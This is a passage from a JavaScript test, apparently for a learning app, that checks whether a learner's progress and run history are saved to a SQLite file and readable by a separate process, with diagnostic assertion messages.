      const seenByServer = JSON.stringify(viaApi.body || {}).includes("g6-ratios");
      const total = db.prepare("SELECT COUNT(*) c FROM progress").get().c;
      assert(false, seenByServer
        ? `the server can see this progress but a second connection to the file cannot (file holds ${total} progress rows) — a read-visibility fault, not a write failure`
        : `the run was accepted but no progress was recorded anywhere; the server cannot see it either (file holds ${total} progress rows)`);
    }
    assert(row.best_pct === 88, `expected 88%, stored ${row.best_pct}`);
    const runs = db.prepare("SELECT COUNT(*) c FROM runs WHERE learner_id = ?").get(kid.id);
    assert(runs.c === 1, `run history not written (found ${runs.c} rows)`);
    return "progress and run history are on disk, readable by a separate process";
  }
};
